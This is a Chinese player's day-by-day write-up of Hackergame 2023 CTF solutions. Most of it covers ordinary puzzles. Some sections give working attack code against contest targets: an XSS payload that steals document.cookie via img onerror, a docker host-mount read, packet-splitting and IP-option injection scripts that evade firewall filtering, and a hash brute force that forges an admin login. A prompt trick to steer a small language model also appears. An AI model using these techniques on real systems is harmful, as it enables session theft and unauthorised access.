---
title: Hackergame 2023 解题报告 by piscesciurus
date: 2023-11-05
dates: 2023-11-04 ~ 2023-11-05
excerpt: 这样的爆破题不管在哪个比赛里都是相当炸裂的存在。
tags:
- CTF
---

<i>及格喵！</i>

[也发表在GitHub。](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/players/piscesciurus/README.md)

# 第1天
## Hackergame启动

<i>那么就发出很大的声音掩盖过去吧！</i>

https://cnhktrz3k5nc.hack-challenge.lug.ustc.edu.cn:13202/?similarity=114514

## 猫咪小测

啊？鼠标悬停时显示楼层？这什么反人类的UI？

## 更深更暗

<i>这么重要的端口号，用在这么简单的题目上真的好吗？</i>

啊这，原来只要全选复制就能拿到，我滚了好久，扒了源码才做出来。

```javascript
`flag{T1t@n_${CryptoJS.SHA256(`dEEper_@nd_d@rKer_${localStorage.token}`).toString().slice(0, 32)}}` // 🤡
```

## Git? Git!

<i>Git好兄弟，有隐私信息它是真泄露，有重要文件它是真删除。</i>

以为会更难一些，所以直接遍历了所有存在于仓库中的文件。

```sh
git cat-file --batch --batch-all-objects | grep --text flag
```

## 组委会模拟器

<i>高频率星球近期频发外星人绑架事件，各位有什么头猪吗？</i>

可能是最短的脚本？

```javascript
setInterval(() => find('hack[', 1, 0, 1) && getSelection().focusNode.parentElement.click(), 50)
```

`window.find`的作用是模拟Ctrl+F，因为实在太没用还是个非标准函数而无人问津，却意外地在这里方便了脚本的编写，以至于都不需要类名。我知道这个函数是因为在研究`<details>`为什么可以被Ctrl+F展开时，发现了[`hidden="until-found"`](https://css-tricks.com/newsletter/295-hidden-until-found/)属性。

## JSON ⊂ YAML?

明明搜到的也是[这篇文章](https://john-millikin.com/json-is-not-a-yaml-subset)，但就是眼瞎没看到1e2，但是看到了NO，所以写了NaN（这都什么逻辑）。

```json
{"":0,"":NaN}
```

## 🪐 小型大语言模型星球 / You Are Smart

<i>🐮, hackergame accepted, you are smart!</i>

> You are smart. You are smart. You are smart.

## 奶奶的睡前flag故事

<i>相信的心就是你的魔法！</i>

https://acropalypse.app/
## 惜字如金2.0

<i>这就是~~何日君再来~~puzzle hunt给我的自信。</i>

手工推理的。

## 虫

<i>我觉得还是当昆虫轻松一些。</i>

找到MMSSTV，上古时代的界面难用得要死，居然只能录音而不能读取WAV。不过搜到MMSSTV使用的MMV格式其实就是单声道、11025Hz的WAV，所以重采样并改扩展名就可以避免社死了。

## 赛博井字棋

啊这，原来只要开两个窗口就能吃子。难怪我想不出怎么搞TOCTTOU攻击。

```javascript
board.map(x => x.fill(0))
```

## HTTP集邮册
<i>现在，闭上眼睛，想象小狐狸在HTTP世界里寻找能让nginx返回任意状态码的请求头……</i>

无状态码：
```
GET /\r\n\r\n
```

100：

```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
Expect: 100-continue\r\n\r\n
```

200：
```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n\r\n
```

206：
```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
Range: bytes=114-514\r\n\r\n
```

304：

```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n
```

400：
```
114514
```

404：

```
GET /114514 HTTP/1.1\r\n
Host: 114514.com\r\n\r\n
```

405：
```
POST / HTTP/1.1\r\n
Host: 114514.com\r\n\r\n
```

412：

```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
If-Match: 114514\r\n\r\n
```

414：

```
GET /114514/114514/114514（此处省略114514个114514） HTTP/1.1\r\n
Host: 114514.com\r\n\r\n
```

416：

```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
Range: bytes=114514-114514\r\n\r\n
```

501：
```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
Transfer-Encoding: 114514\r\n\r\n
```

505：

```
GET / HTTP/2.0\r\n
Host: 114514.com\r\n\r\n
```

因为以为GET不能携带数据，无法触发413，所以在13种可能得到的状态码中唯独漏掉了这一种，为之后搞定了iptables却搞不定POST埋下了伏笔。

这天晚上，我做了个梦，梦到nginx有个自定义请求头X-Response-Code，能让服务器返回指定的状态码。晚安，玛卡巴卡。

# 第2天

Hackergame绝赞进行中！

## 🪐 高频率星球

安装了asciinema，但只用来观赏，不知道有cat子命令。

```python
from itertools import islice
import json
s = ""
for l in islice(open("asciinema_restore.cast"), 38, 1884):
    s += json.loads(l)[2]
s = s.partition("\x1b[7m(END)")[0]
s = s.replace("\x1b[7mflag.js\x1b[27m\x1b[K", ":\x1b[K")
s = s.replace(":\x1b[K\r\x1b[K \x1b[KESC\b\b\bESC\x1b[K[\b[\x1b[K6\b6\x1b[K~\b~\r\x1b[K", "")
open("asciinema_restore.js", "w").write(s)
```

因为没有过滤CR以及空行等等细节原因，没复原出正确的SHA-256，但能运行出正确的flag，也够了。

## 为什么要打开/flag 😡 / LD_PRELOAD, love!

<i>为什么要参加Hackergame😡为什么要打开题目😡为什么要下载附件😡为什么要提交flag😡</i>

```sh
musl-gcc -static 😡.c
```

## Docker for Everyone

<i>Google is all you need.</i>

```sh
docker run -itv /:/a alpine cat /a$(readlink /flag)
```

## 旅行照片3.0

找错诺贝尔奖得主，不知道哪天公园有活动，没点进链接就没看到志愿者招募，在重新找对诺贝尔奖、枚举出~~1919年~~8月10日后得到了问卷编号。学术之旅以为是乘电车，出口当成上野站，纳闷道：学长莫非是残障人士，所以博物馆免票？

> 1. 2023-08-10 https://www.uenopark.info/2023/ume-shu-2023/
> 2. ICRR https://www.s.u-tokyo.ac.jp/en/gallery/nobelprize/
> 3. S495584522 https://umeshu-matsuri.jp/tokyo_staff/
> 4. 0 https://www.tnm.jp/modules/r_free_page/index.php?id=113
> 5. 安田讲堂 https://statphys28.org/banquet.html
> 6. 熊猫-秋田犬 https://plaza.rakuten.co.jp/ayumilife/diary/202308110000/

## 🪐 流式星球

嫌OpenCV太大，叫GPT写了个用pygame的宽度调教程序。程序好像有点问题，但也调出来了。赛后才想起来OpenCV有滑动条会好用些，不用全靠自己搞上下左右按键交互。

```python
import pygame
import numpy as np

a = np.fromfile("video.bin", dtype=np.uint8).reshape((-1, 3))[:114514]
w = 640

pygame.init()
screen = pygame.display.set_mode((800, 600))
pygame.key.set_repeat(200, 50)
while True:
    event = pygame.event.wait()
    if event.type == pygame.QUIT:
        pygame.quit()
        break
    elif event.type == pygame.KEYDOWN:
        w += (event.key == pygame.K_RIGHT) - (event.key == pygame.K_LEFT)
        w += ((event.key == pygame.K_UP) - (event.key == pygame.K_DOWN)) * 10
    elif event.type == pygame.MOUSEMOTION:
        continue
    pygame.display.set_caption(f"video {w = }")
    screen.fill((255, 255, 255))
    screen.blit(pygame.surfarray.make_surface(
        np.moveaxis(np.resize(a, (600, w, 3)), 0, 1)
    ), (0, 0))
    pygame.display.flip()
```

## 微积分计算小练习2.0

<i>毕竟正常人怎么可能留 `<img src=a onerror="alert(1)">` 这种评论嘛！</i>

我是谁？我在哪？要干嘛？然后发现`"+114514+"`成功了，难绷。

连函数调用需要的括号都被过滤了，25字符什么都做不到。就在为`\74"+location["hash"]+"\76`以壹字节略微超出限制，还无法注入空格而发愁时，发现了location URL字符串硬塞也能塞进属性里。

那么接下来就是典中典`<img onerror>`了。评论`\74img "+location+"\76`，然后让bot浏览下面的网页。

```javascript
<script>open("http://web/result#/src/onerror=comment[1].value=btoa(document.cookie).slice(0,25),document.forms[0].submit()")</script>
```

想到解法时比赛平台已经关闭了。不过好像虽然比赛平台关闭了，但是202.38.93.111还在。但是我把IP弄丢了。安然入眠。

因为调试时设置了document.cookie，从这题开始，我的浏览器给202.38.93.111发的HTTP请求里就一直带着Cookie: flag=114514的标头，不管哪题都是。

### 完成练习不需要了解任何微积分与符号计算的知识

[只需要fx-991CN X。](微积分计算小练习.pdf)

fx-999CN CW精度更高，不过老机型精度也够用了。新机型连ln都要按SHIFT才能输入未免也太变态了点。

# 第3天

早上实现并提交了微积分计算小练习2.0，同样被URL编码中的加号坑了一把，不过看到答案错误时一下子就发现了，没想到后来官方还专为这个问题补了个提示。

## 异星歧途

<i>这样的爆破题不管在哪个比赛里都是相当炸裂的存在。</i>

玩了一小时，发现题目给出的地图里没有任何东西是见过的，开摆，直接做吧。

（拨动开关）（嘭！）（回到出生点）（保存并退出）（删除存档）（导入地图）（加载）（移动到第三区）（拨动开关）（砰！）

尝试爆破（指枚举第三区的答案），结果还没爆破完就已经推理出来了。

# 第4天

game已经结束了，剩下的全是坐牢。

低带宽星球的容器不知道为什么一直跑不通，直到今天，终于发现是因为糊的运行脚本里`$1`写成了`$0`。

以为seccomp题只要不调用open和openat就行，但不知道为什么老是报operation already in process错，查了一下发现错误码是114。这就很合理了，肯定是自定义错误码，才发现代码里那么大一个系统调用白名单，打扰了，告辞。

## Komm, süsser Flagge / 我的POST & 我的P

<i>如果你不知道`nc`是什么，或者在解上面的题目时遇到了困难，可以参考我们编写的[萌新入门手册：如何使用nc/ncat偷到flag？](https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/#%E7%A4%BA%E4%BE%8B)</i>

第一小题以为如网上所说是靠iptables的BM算法有漏洞，但顾名思义，iptables只在IP包层面上处理，只要把POST拆开来就行。手头没有任何专业网络工具的我想出了一种天才般的解法：

```sh
(
echo -n 'PO'
sleep .114514
echo 'ST / HTTP/1.1
Host: 114514.com
Content-Length: 15

114514:asdfgh==
'
) | nc 202.38.93.111 18080
```

拆包全靠这个婴儿般的睡眠，改成sleep 0就过不了了。

其实调了老半天invalid token的问题，还以为是要搞什么URL编码，其实是死于没写Content-Length。HTTP集邮册没集到413的伏笔回收了属于是。

第二小题懒得研究u32规则，根据题目标题以及0x50瞎猜一波TCP数据不可以以P开头。确实是这个意思，但发现把第一小题的端口号改成第二小题的端口号就自动做完了，就没有继续研究flag里的reserved byte是什么意思。

## O(1)用户登录系统

<i>为什么要登录😡</i>

睡前载入一道数学题，就可以在梦中打CTF了。

感谢[lucky-commit](https://github.com/not-an-aardvark/lucky-commit)提供的散列碰撞耗时估计。

不是凑开头为“admin:”散列值，而只需要凑在admin:后添加字符可得到的可UTF-8解码并仅包含零或一个“:”的散列值。看起来是admin题，结果最大的计算量其实在UTF-8上。

```python
import pwnlib.util.iters
import string
from hashlib import sha1

def f(x: str) -> bool:
    try:
        s = sha1(("admin:" + x).encode()).digest().decode()
    except UnicodeDecodeError:
        return False
    return s.count(":") == 1 and s.isprintable()

print(pwnlib.util.iters.mbruteforce(f, string.ascii_letters + string.digits, 8))

def g(x: str) -> bool:
    try:
        s = sha1((":" + x).encode()).digest().decode()  # 用户名可以为空
    except UnicodeDecodeError:
        return False
    return ":" not in s and s.isprintable()

print(pwnlib.util.iters.mbruteforce(g, string.ascii_letters + string.digits, 8))

# 1
# :m10WVp.7aƏ^N滷v2-K ,U"ξmzˢw1}?j>}m/
# :m10WVp.7aƏ^N滷v2-K ,U"ξmzˢw1}?j>}m/
# EOF
# 2
# admin:759D:4b202c5522cebe6d7acba277317d3f6a3e7d6d2f83d88a86a6e1c277d0e9e852e676e72146602afc
```

# 第5天
早上把O(1)用户登录系统的解法实现并提交了。
## 🪐 小型大语言模型星球 / Accepted

<i>虚假的算力题撞散列，真正的算力题跑模型。</i>

将TinyStories数据集全部拖下来，搜索“ accepted”，能找到近一万个，取前七个字符挨个试过去，可得两解：“Apology”和“atively”。Apology很能解释得通，因为“Apology accepted”在数据集中出现了四次。

乱试的时候发现输入“po”或“ioioio”的话，模型会回复“ioioioioioioioioioioioioioioioioioioioioioioioioioioioioioio”。

## 🪐 低带宽星球

<i>下次还填非常简单！</i>

第一小题当然第一天就做完了，随便找个无损压缩工具，连PNG都能做到2KB以内，PNGGauntlet还能再战二十年，然后就开始思考如何极限压缩。时间已经过去了五天。仔细研究了GIF标准，甚至尝试了MATLAB和PDF，无果。通过SVGZ能压缩到98字节：
```sh
echo -n '<svg><rect height="1024" width="1024" fill="#16a33e"/><rect height="1024" width="666" fill="#d618d7"/><rect height="1024" width="368" fill="#01c9d3"/></svg>' | gzip | wc -c
```

注意height在width之前，因为height是重复的，可以跟前面的`<rect`合并压缩，比width在前的版本少1字节……@Ishisashi[同样采用SVGZ](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/players/mcfx/wp.md#%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83)，但不是`<rect>`而是`<path>`，压到了96字节。

libvips支持很多图片格式，可这些图片格式都存在巨大的问题，要么是文件头尾就已超过50字节（唉，PDF），要么是压缩算法不利于超大色块（唉，TGA），要么是两者皆有（唉，PNG）。GIF其实很有希望，因为[它的文件头很小，不透明的话更小](http://probablyprogramming.com/2009/03/15/the-tiniest-gif-ever)，还有图像描述符这种说法，可以指定子图覆盖的矩形区域，剩余像素以默认背景色填充。但是试了一通发现不能给每个图像描述符分别指定背景色，libvips也不认全图背景色，歇菜。

搜到[FLIF的作者指出FLIF可以以0字节/像素的效率在压缩单色图片任务中击败其他格式，文件头也很小](https://cloudinary.com/blog/a_one_color_image_is_worth_two_thousand_words)。后来，FLIF中的技术合并到了JPEG/XL，[JPEG/XL的压缩有着更广阔的可能性](https://news.ycombinator.com/item?id=31115857)。虽然libvips的主页上没有明确说明，但是因为接了ImageMagick，实际上是能解码FLIF格式的。用这些较新的格式的编码器自动转换所得的图片都不小。但是，[直接编码JPEG/XL的决策树可以创造生成式艺术](https://jpegxl.info/art/)，[其工具的默认宽高是1024像素](https://jxl-art.surma.technology/wtf)……读到这里时，就知道这一定是答案了。

```
if x > 367
  if x > 665
    if c > 0
      if c > 1
        - Set 62
        - Set 163
      - Set 22
    if c > 0
      if c > 1
        - Set 215
        - Set 24
      - Set 214
  if c > 0
    if c > 1
      - Set 211
      - Set 201
    - Set 1
```
能和榜一榜二大哥做出同一道题，真是倍感荣幸，虽然做出来后感觉漫无目<ruby>的<rt>dì</rt></ruby><ruby>地<rt>de</rt></ruby>搜格式花了五天，编码只花了五分钟的体验还是挺一言难尽的……@mcfx的[大力出奇迹做法](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/players/mcfx/wp.md#%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83)也许才对得起最后做出的人数吧。

# 第6天

瞎跑小语言模型，处理器温度飙升，没有进展。
# 第7天
## 小Z的谜题

<i>puzzlehunt\_of\_z3.py</i>

程序描述的是将16个实心长方体沿坐标轴放入5³的立方体盒子中，第二、三小题分别要求产生的点、直线、平面、空间总数≤136、≥157。

反正都是丢到约束求解器里，这样的直观理解真有助于解题吗？有的，主要就是给Z3脚本换了个写法，也不知道到底是优化还是负优化。

```python
import z3
from itertools import permutations

a = [[[z3.Int(f"a{i}{j}{k}") for k in range(5)] for j in range(5)] for i in range(5)]
c = [[z3.Int(f"c{u}{n}") for n in "iIjJkK"] for u in range(16)]
s = z3.Solver()
for u, lwh in enumerate(
    [(1, 1, 3)] * 3
    + [(1, 2, 2)] * 4
    + [(1, 2, 4)] * 2
    + [(1, 4, 4)] * 2
    + [(2, 2, 2)] * 2
    + [(2, 2, 3)] * 3
):
    s.add(z3.Or([
        z3.And([
            a[i + di][j + dj][k + dk] == u
            for di in range(l)
            for dj in range(w)
            for dk in range(h)
        ] + [
            c[u][0] == i,
            c[u][1] == i + l,
            c[u][2] == j,
            c[u][3] == j + w,
            c[u][4] == k,
            c[u][5] == k + h,
        ])
        # 固定一个1×2×4长方体的朝向，说不定能减小搜索空间？也不知道是不是真的有效……
        for l, w, h in ((lwh,) if u == 7 else set(permutations(lwh)))
        for i in range(6 - l)
        for j in range(6 - w)
        for k in range(6 - h)
    ]))
score = z3.Sum([
    z3.Or([
        z3.And([
            i == -1 or z3.Or(c[u][0] == i, c[u][1] == i),
            j == -1 or z3.Or(c[u][2] == j, c[u][3] == j),
            k == -1 or z3.Or(c[u][4] == k, c[u][5] == k),
        ])
        for u in range(16)
    ])
    for i in range(-1, 6)
    for j in range(-1, 6)
    for k in range(-1, 6)
])
# s.add(score <= 136)  # Medium
# s.add(score == 157)  # Hard
if s.check() != z3.sat:
    print("No solution")
m = s.model()
y = "".join(sorted("".join(str(m.evaluate(c[u][n])) for n in range(6)) for u in range(16)))
print(y)
print(m.evaluate(score))
# 148 010215012545020201022304023524033502121214150115151545231302241324250101253524351202352502451324
# 136 012413030213030235032435034545040401044504132313133413343414350213350235352315353545450301453504
# 157 010204012501020245022413022535024513121214131501150104231515250145341335351303353502353525451335
```

第一小题大约十秒可得一组。第二小题跑了十分钟，居然真的跑出来了。第三小题跑了半小时，居然真的跑出来了。

倒是flag里说的Google is all you need到底是啥？我都不知道该搜什么关键词，搜个毛线球？

# 第8天
早上想出了不可加密的异世界2第一小题的标准解法，但来不及了，写了个交互就打铃交卷了。下午在阅读官方题解中度过，孩子很喜欢，明年还会来。

## Komm, süsser Flagge / 我的GET

<i>Did you hear the IP packet from 1981?</i>

IP包头20字节，TCP包头20+字节，必然要在包头动手脚了。看起来可以直接加大IP包头长度，在padding里塞垃圾。理论有了，但不知道怎么实现。于是我在GitHub USTC-Hackergame组织里搜iptables，呃呃，当时还只有四篇2020年的题解，现在一下子多了十几篇2023的……好吧，我这篇也是。

选用的是@Haruka的[从零开始的HTTP链接题解](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/players/Haruka/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%20HTTP%20%E9%93%BE%E6%8E%A5/readme.md)。

先是研究scapy手搓IP包，发现连接前两小题都收不到数据，连百度也是有时能通有时不能通，试了给出的拦截RST也不知道怎么正确配置，一直收不到响应数据，感觉搞定是无望了。不过好像有好些其他选手同样被这个RST坑，后来也靠iptables解决了，那看来往年题解还是比Google乱搜要靠谱得多。

再往下看，发现这个NFQUEUE看起来挺不错的，不用手工构造三次握手，看起来出问题的可能性小很多。然后发现WSL内核好像没有自带NFQUEUE模块，现场重新编译内核什么的就不用想了。

树莓派，启动！

然后发现Debian已经没有iptables了，取而代之的是nftables。

在搞nftables的时候尝试写了个这样的脚本。

```nftables
#!/usr/sbin/nft -f
flush ruleset
table ip firewall {
  chain outgoing {
    type filter hook output priority 0
    policy drop
    iifname lo accept
    tcp dport {80, 18080} accept
  }
}
```

写完运行发现卡死了。毕加思索后恍然大悟：它成功地把我通过局域网到Raspberry Pi的SSH连接屏蔽掉了。从未配出过如此成功的防火墙……好在强行重启一下就恢复原状了。

配置命令：

```sh
sudo apt install openvpn libnetfilter-queue-dev # Debian bookworm版本的包名
sudo openvpn --config hg-guest.ovpn & # 某些网络环境😡
sudo nft -f nft.rules
python -m venv env
source env/bin/activate
pip install scapy NetfilterQueue
sudo $(which python) a.py
```

nft.rules：

```nftables
flush ruleset
table ip firewall {
  chain outgoing {
    type filter hook output priority 0
    policy accept
    tcp dport {18080, 18082} queue num 3
  }
}
```

a.py：

```python
from netfilterqueue import NetfilterQueue, Packet
from scapy.all import *

def f(pkt: Packet) -> None:
    b = bytearray(pkt.get_payload())
    print("before", b)
    hl = b[0] % 16 * 4
    b[0] += 3  # ihl
    b[2] += (b[3] + 12) >> 8  # len
    b[3] = (b[3] + 12) & 0xff
    b[hl:hl] = b"\x02\x0cGET / HTTP"
    packet = IP(b)  # 借scapy算个校验和
    del packet[IP].chksum
    b = raw(packet)
    print("after", b)
    pkt.set_payload(b)
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(3, f)
try:
    nfqueue.run()
finally:
    nfqueue.unbind()
```

最后用题目提供的curl命令即可获得flag。

一开始02 0C的那地方写了00 00，不知道为啥不行，理论上第一个00就标记了选项到此结束的。看到一个叫做“Security (defunct)”的选项，就用它了。
